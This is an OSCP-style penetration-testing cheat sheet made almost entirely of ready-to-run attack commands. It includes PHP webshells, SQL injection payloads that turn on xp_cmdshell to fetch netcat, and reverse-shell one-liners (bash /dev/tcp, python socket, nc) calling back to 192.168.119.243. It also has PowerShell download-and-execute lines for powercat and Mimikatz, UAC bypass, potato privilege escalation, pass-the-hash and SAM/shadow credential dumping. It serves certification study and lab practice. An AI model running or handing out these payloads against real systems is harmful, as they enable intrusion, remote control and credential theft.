# O.S.C.P-cheat-sheet

## Program first line execution
```
#!/bin/bash
#!/usr/bin/python
```

## Powershell exe path
```
32 bit:
%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe

64 bit:
%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
```

## Python tty spawn
```
python -c 'import pty; pty.spawn("/bin/bash")'
python2.7 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo && fg
```

## Python/PHP http server
```
python2 -m SimpleHTTPServer 80
python3 -m http.server 80

php -S 0.0.0.0:80
```

## Directory/Path Traversal
Linux
```
/etc/passwd
/etc/shadow
/etc/issue
/etc/group 
/etc/resolv.conf
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/proc/self/environ
/proc/version
```
Windows
```
C:\WINDOWS\System32\drivers\etc\hosts
C:\Users\Administrator\NTUser.dat
C:\Documents and Settings\Administrator\NTUser.dat
C:\inetpub\wwwroot\global.asa
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\passwords.txt
C:\xampp\readme-en.txt
C:\apache\logs\access.log
C:\apache\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\logs\access.log
C:\Program Files\Apache Group\Apache\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files (x86)\FileZilla Server\FileZilla Server.xml
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\DATA\master.mdf
C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.mdf
C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.mdf
C:\Windows\system32\config\regback\sam
C:\Windows\system32\config\regback\security
C:\Windows\system32\config\regback\system
C:\Windows\repair\sam
C:\Windows\repair\system
```

## PHP cmd injection
```
<?php system("whoami"); ?>
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

## Ping/OS injection
```
|
;
%0A
Newline (0x0a or \n)
&
&&
||
`command`
$(command)
```

## XSS 
```
<iframe src=http://192.168.119.243/mHxH2w height="0" width="0">
<iframe src=http://192.168.119.243/MmVIPvoTOI>
```

## SQL login/ Injection
login/commands
```
# Linux:
mysql -u root -p
mysql -h 10.1.1.1 -u root
SELECT @@version
SELECT user()
SHOW DATABASE
SHOW TABLES
SELECT host, user, password FROM mysql.user

# Windows:
Mssql (port 1433), common username = sa
sqsh -S 10.11.1.31 -U sa -P poiuytrewq
SELECT @@version
SELECT user_name()
SELECT name FROM master..syslogins
SELECT name, password FROM master..sysxlogins

cmd:
sp_configure 'show advanced options', '1'
RECONFIGURE
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
EXEC master..xp_cmdshell 'whoami'
EXEC master..xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.119.243:80/powercat.ps1");powercat -c 192.168.119.243 -p 443 -e cmd | powershell -noprofile'
```
Injections
```
somepass' or '1' = '1
tom' or 1=1 --
tom' or 1=1 #

# Union:
'union all select table_name,null,null from all_tables--              
'union all select column_name,table_name,null FROM all_tab_columns--
'union all select user_name,password,null from web_users--

'union select name,1 FROM master..syslogins--
'union select name,1 FROM master..sysdatabases--
'union select master..syscolumns.name,1 FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sql_logins'--

';EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
';EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
';EXEC xp_cmdshell "powershell.exe wget http://192.168.119.243:80/nc.exe -OutFile c:\\Users\Public\\nc.exe";--
';EXEC xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 192.168.119.243 443";--

# Error based:
',CONVERT(INT,@@version))--

',CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--

',CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='users' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--

',CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--

',CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--

',CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM [archive]..[pmanager] )+CHAR(58)+CHAR(58))))--

',CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 alogin FROM (SELECT top 1 alogin FROM archive..pmanager ORDER BY alogin ASC) sq ORDER BY alogin DESC)+CHAR(58)+CHAR(58))))--

',CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 1 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
```

## Curl request
```
# GET:
curl -i -s -k -X $'GET' $'https://10.1.1.1/php-reverse-shell.php'

# POST:
curl -i -s -k -X $'POST' --data-binary $'cmd=chmod%20%2Bs%20%2Fusr%2Fbin%2Fmysql&submit' $'http://10.1.1.1:8080/start_page.php?page=cmd.php'
curl -s --data "<?php shell_exec('nc -e /bin/sh 192.168.119.243 443') ?>" 'http://10.11.1.1/internal/advanced_comment_system/admin.php?ACS_path=php://input'
```

## Port forwarding
```
sudo sshuttle -r sean@10.11.1.251 10.1.1.0/24
ssh -f -N -D 9050 sean@10.11.1.251

ssh -N -R 127.0.0.1:5555:127.0.0.1:4444 victim@10.1.1.1 -f             ("their ip":port:"our ip":port) - receiving reverse shell
ssh -N -R 127.0.0.1:8080:127.0.0.1:8080 kali@192.168.119.243 -f        ("our ip":port:"their ip":port) - connecting server
```

## Scans
Nmap
```
nmap -vv -Pn -T4 -sV -p- 10.1.1.1
nmap -vv -Pn -T4 -sV -sC --version-all --osscan-guess -A -F 10.1.1.1

nmap -vv -Pn -T4 -sV -p 21 --script="banner,(ftp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" 10.1.1.1
nmap -vv -Pn -T4 -sV -p 25 --script="banner,(smtp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" 10.1.1.1
nmap -vv -Pn -T4 -sV -p 139,445 --script="banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" 10.1.1.1
nmap -vv -Pn -T4 -sV -p 80,443 --script="banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" 10.1.1.1
nmap -vv -Pn -T4 -sV -p 1433 --script="banner,(ms-sql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args="mssql.instance-port=1433,mssql.username=sa,mssql.password=sa" 10.1.1.1
```
Http scan
```
nikto --host=10.1.1.1
dirb http://10.1.1.1/
sudo feroxbuster -u http://10.1.1.1 -t 10 -w /root/.config/AutoRecon/wordlists/dirbuster.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -q -e
gobuster dir -u https://10.1.1.1/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -b ''
curl -sSikf http://10.1.1.1/robots.txt
curl -sSikf http://10.1.1.1/.well-known/security.txt
```

## GUI smb/ftp folder
```
xdg-open smb://
xdg-open ftp://
```

## Mount/connect share
Linux
```
showmount -e 10.11.1.136
sudo mount -t cifs //10.11.1.136/'Bob Share' /tmp/lol
sudo mount -o port=5555 -t nfs 127.0.0.1:/srv/Share /tmp/lol

smbclient -N //10.2.2.23/ADMIN$             (connect smb share)
smbclient -U '%' -N \\\\10.2.2.23\\ADMIN$ 
```
Windows
```
net use * \\192.168.119.142\lolll
\\MAIL\Users\eric\Desktop\reverseshell64.exe
\\\\10.11.1.229\\share\\reverseshell64.exe
```

## Linux transfer file methods
Download
```
wget http://192.168.119.243:80/linpeas.sh
curl http://192.168.119.243:80/linpeas.sh -o linpeas.sh
ftp offsec:offsec
```
Upload
```
scp flag.txt kali@192.168.119.243:/home/kali
ftp offsec:offsec
```

## Windows transfer file methods
Download
```
powershell.exe -ExecutionPolicy Bypass "Start-BitsTransfer -Source 'http://192.168.119.243:80/winPEASx64.exe'" -Destination C:\
powershell.exe -ExecutionPolicy Bypass "Invoke-WebRequest -URI 'http://192.168.119.243:80/winPEASx64.exe'" -OutFile C:\
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.243:80/winPEASx64.exe', 'winPEASx64.exe')
certutil.exe -urlcache -f http://192.168.119.243:80/winPEASx64.exe winPEASx64.exe
wget http://192.168.119.243:80/winPEASx64.exe
curl http://192.168.119.243:80/winPEASx64.exe
bitsadmin /transfer pwn /download http://192.168.119.243:80/winPEASx64.exe
```
Direct execution from Powershell
```
powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/powercat.ps1');powercat -c 192.168.119.243 -p 443 -e cmd"
powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/PowerUp.ps1');Invoke-AllChecks"
powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"kerberos::list /export"'"
powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.119.243:80/Invoke-Kerberoast.ps1");Invoke-Kerberoast"
powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.119.243:80/PowerView.ps1');Get-DomainUser -Properties DisplayName, MemberOf | Format-List"
```
Upload
```
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.243/uploads.php', 'system')      (need start apache2)
pscp.exe flag.txt kali@192.168.119.243:/home/kali
ftp offsec:offsec
```
SMB server (download&upload)
```
kali: impacket-smbserver lolll . 
victim: net use * \\192.168.119.243\lolll

copy Z:\nc64.exe
xcopy Z:\Recon /E                                           (recursive)
Z:\nc64.exe -nc 192.168.119.243 443 -e cmd.exe              (direct execution)
```

## Reverse shell
### One liner
Linux
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.243 443 >/tmp/f
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.243",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
bash -i >& /dev/tcp/192.168.119.243/443 0>&1
/bin/bash -l > /dev/tcp/192.168.119.243/443 0<&1 2>&1
nc -nv 192.168.119.243 443 -e /bin/bash
```
Windows
```
powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/powercat.ps1');powercat -c 192.168.119.243 -p 443 -e cmd"
nc64.exe -nv 192.168.119.243 443 -e cmd.exe
Z:\nc64.exe -nv 192.168.119.243 443 -e cmd.exe
```
### Files
Msfvenom
```
# Stageless
32bit:
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell32.exe
64bit:
msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell64.exe

# Staged
32bit:
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell32.exe
64bit:
msfvenom -a x64 --platform Windows -p windows/x64/shell/reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell64.exe

add followings if needed:
EXITFUNC=thread, -b "\x00\x0a\x0d\x25\x26\x2b\x3d", –e x86/shikata_ga_nai, -i 20
```
Other files/webshell
```
msfvenom -f asp -f elf -f c -f raw -f js_le -f hta-psh -f war 
locate webshell to list webshell
common used: php-reverse-shell.php
```

## Exploitation
Linux
```
./linpeas.sh
sudo -l
find / -perm -u=s -type f 2>/dev/null
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
find / -perm -2 -type f 2>/dev/null
check /backups or /var/backups
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```
Windows
```
systeminfo
whoami /all
winPEASx64.exe
powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/PowerUp.ps1');Invoke-AllChecks"
net user
net localgroup administrators
netstat -ano
icacls
sc qc 
schtasks /query /fo LIST
shutdown /r /t 0
```
AD
```
# Direct execution
powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.119.243:80/PowerView.ps1');Get-DomainUser -Properties DisplayName, MemberOf | Format-List"
powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.119.227:5556/Invoke-Kerberoast.ps1");Invoke-Kerberoast"

# Import modules Powerview
$env:PSModulePath -split ';'                  (modules path)
Enter PS,
Import-Module Recon
Get-DomainUser -Properties DisplayName, MemberOf | Format-List
Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
Get-NetLoggedon -ComputerName
Get-NetSession -ComputerName
Get-DomainGroup -properties name
Get-DomainGroup -Identity 'Domain Admins'
Get-DomainGroupMember -Identity 'Domain Admins' | Select-Object MemberDistinguishedName
Get-NetUser -SPN
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
cat hash.txt | tr -d '\n' | tr -d '\n' | tr -d ' ' | sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' > newhash.txt
Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerbhash.txt
hashcat -m 13100

# Mimikatz
privilege::debug
token::elevate
sekurlsa::logonpasswords
sekurlsa::tickets
sekurlsa::tspkg
lsadump::lsa /inject
kerberos::list /dump

klist
```

## Powershell execute .ps1 file
```
add command at end of .ps1 file, then
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -file powercat.ps1
```

## Find something
Linux
```
grep -R password .                                  (find word inside files)
find . -iname flag                                  (find file name)
find . -type f -name "*.php"                        (find file type/extension)
```
Windows
```
findstr /spin "password" *.*                        (find word inside files)
dir /s *flag*                                       (find file name)
findstr /si password *.xml *.ini *.txt *.config     (find word inside files type/extension)
```

## Connect to Windows machine
```
# RDP
rdesktop -E -r clipboard:CLIPBOARD -u eric -p sup3rs3cr3t 10.11.1.1
xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /u:administrator /v:10.11.1.1
xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /u:administrator /pth:cb2d5be3c78be06d47b697468ad3b33b /v:10.11.1.1

# Pth Winexe/Psexec/Smb
pth-winexe -U tomahawk%00000000000000000000000000000000:AB730EFA31140CE6A9262841E4109C95 //10.1.1.248 cmd.exe
impacket-psexec -hashes 00000000000000000000000000000000:AB730EFA31140CE6A9262841E4109C95 tomahawk@10.1.1.248

# WinRm (port 5985,5986)
evil-winrm -i 10.11.1.1 -u john -p easyas123
evil-winrm -i 10.11.1.1 -u john -H AB730EFA31140CE6A9262841E4109C95

# Runas another user
runas /env /noprofile /user:tomahawk RibSt3ak69 "%SystemRoot%\system32\cmd.exe"
```

## Exploit compiling
Linux
```
gcc -static/-shared
```
Windows
```
i686-w64-mingw32-gcc -lws2_32             (32-bit)
x86_64-w64-mingw32-gcc                    (64-bit)
```

## Docker to compile older Linux/gcc
```
docker pull gcc:4.6
docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp gcc:4.6 gcc -o lol lol.c
```

## Privilege escalation
Linux
```
# GTFOBins
mysql -u root -p -e '\! /bin/sh'

# Root user to add in /etc/passwd
root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash        (root2:mrcake)

# Dirtycow2
https://www.exploit-db.com/exploits/40839
gcc 40839.c -o 40839 -lcrypt -pthread

# Mysql UDF2 PE
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
show variables like '%plugin%';
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system('bash -c "bash -i >& /dev/tcp/192.168.119.243/443 0>&1"');
```
Windows
```
# High mandatory level to SYSTEM
PsExec64.exe -accepteula -i -s %SystemRoot%\system32\cmd.exe
PsExec64.exe -i -accepteula -d -s C:\Users\nicky\AppData\Local\Temp\reverseshell64.exe

# SeImpersonatePrivilege
PrintSpoofer64.exe -i -c cmd.exe
JuicyPotato64.exe -t * -p c:\windows\system32\cmd.exe -l 1338 -a "/c C:\Users\jill\AppData\Local\Temp\nc.exe 192.168.119.243 443 -e cmd.exe" 
JuicyPotato64.exe -t * -p c:\windows\system32\cmd.exe -l 1338 -c {6d18ad12-bde3-4393-b311-099c346e6df9} -a "/c C:\Users\jill\AppData\Local\Temp\nc.exe 192.168.119.243 443 -e cmd.exe" 

# BypassUAC
https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Users\ted\AppData\Local\Temp\reverseshell64.exe" /f
powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden

# Service unquoted path 
sc config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 192.168.119.243 443 -e cmd.exe"
sc qc usosvc
shutdown /r /t 0

# Windows XP SP1 upnphost service
https://guif.re/windowseop#EoP%201:%20Incorrect%20permissions%20in%20services

# Add new user
net user Bill Passw0rd /add
net localgroup administrators Bill /add
net localgroup "Remote Desktop Users" Bill /add

# Print proof
type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
```

## Post exploitation 
Linux 
```
/etc/shadow
hashcat -m1800
```
Windows
```
reg save hklm\system system
reg save hklm\sam sam

samdump2 system sam -o sam.txt
hashcat -m1000
```









